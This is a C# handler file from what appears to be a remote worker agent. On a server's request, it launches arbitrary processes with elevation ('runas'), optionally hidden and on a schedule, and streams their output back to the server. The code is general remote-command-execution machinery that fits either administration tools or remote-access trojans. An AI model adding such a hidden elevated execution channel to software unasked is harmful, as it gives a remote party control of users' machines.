using Common.Client;
using Common.Frames;
using Common.Frames.Command;
using System;
using System.Diagnostics;
using System.Threading.Tasks;
using Common.Client.Handlers;

namespace WorkerCore.Handlers.Command
{
    [RegisterHandler(typeof(RequestFrame))]
    class RequestHandler : HandlerBase
    {
        public RequestHandler(ClientBase worker)
            : base(worker)
        {
        }

        public override async void Start(FrameBase frameBase)
        {
            var frame = frameBase as RequestFrame;
            if (frame == null) return;

            Process process = new Process();
            process.StartInfo.FileName = Common.Tools.Environment.ReplaceEnvironmentVars(frame.FileName);
            process.StartInfo.Arguments = Common.Tools.Environment.ReplaceEnvironmentVars(frame.Arguments);
            process.StartInfo.Verb = "runas";
            if (frame.Hide)
            {
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
            }
            if (frame.RedirectInput)
            {
                process.StartInfo.RedirectStandardInput = true;
            }
            if (frame.RedirectOutput)
            {
                process.StartInfo.RedirectStandardOutput = true;
            }
            if (frame.RedirectError)
            {
                process.StartInfo.RedirectStandardError = true;
            }
            if (frame.StartUtc.Ticks > 0)
            {
                TimeSpan startDelay = frame.StartUtc - DateTime.UtcNow;
                if (startDelay.Ticks > 0) await Task.Delay(startDelay).ConfigureAwait(false);
            }

            ProcessList.Add(frame.Guid, process);
            try
            {
                process.Start();

                if (frame.RedirectOutput)
                {
                    ReadOutput(frame, process);
                }

                if (frame.RedirectError)
                {
                    ReadError(frame, process);
                }

                if (frame.StopUtc.Ticks > 0)
                {
                    KillTask(frame.StopUtc, process);
                }
            }
            catch (Exception ex)
            {

            }

            RemoveInstanceWhenExited(frame, process);
        }

        protected async void KillTask(DateTime utc, Process process)
        {
            try
            {
                while (!process.HasExited)
                {
                    await Task.Delay(1000);
                    if (DateTime.UtcNow > utc)
                    {
                        process.Kill();
                        break;
                    }
                }
            }
            catch
            {

            }
        }

        protected async void ReadOutput(FrameBase frame, Process process)
        {
            try
            {
                while (!process.HasExited)
                {
                    do
                    {
                        char[] buffer = new char[2048];
                        int count = await process.StandardOutput.ReadAsync(buffer, 0, buffer.Length);
                        await SendFrame(new RedirectedOutputFrame(frame.Guid)
                        {
                            Data = new string(buffer, 0, count),
                            Exited = false,
                        }).ConfigureAwait(false);
                    } while (!process.StandardOutput.EndOfStream);
                }

                string data = await process.StandardOutput.ReadToEndAsync().ConfigureAwait(false);
                await SendFrame(new RedirectedOutputFrame(frame.Guid)
                {
                    Data = data,
                    Exited = true,
                }).ConfigureAwait(false); ;
            }
            catch
            {

            }
        }

        protected async void ReadError(FrameBase frame, Process process)
        {
            try
            {
                while (!process.HasExited)
                {
                    do
                    {
                        char[] buffer = new char[2048];
                        int count = await process.StandardError.ReadAsync(buffer, 0, buffer.Length);
                        await SendFrame(new RedirectedErrorFrame(frame.Guid)
                        {
                            Data = new string(buffer, 0, count),
                            Exited = false,
                        }).ConfigureAwait(false); ;
                    } while (!process.StandardError.EndOfStream);
                }

                string data = await process.StandardError.ReadToEndAsync().ConfigureAwait(false);
                await SendFrame(new RedirectedErrorFrame(frame.Guid)
                {
                    Data = data,
                    Exited = true,
                }).ConfigureAwait(false); ;
            }
            catch
            {

            }
        }

        protected async void RemoveInstanceWhenExited(FrameBase frame, Process process)
        {
            try
            {
                while (!process.HasExited)
                {
                    await Task.Delay(10000).ConfigureAwait(false);
                }
            }
            catch { }
            ProcessList.Remove(frame.Guid);
        }
    }
}
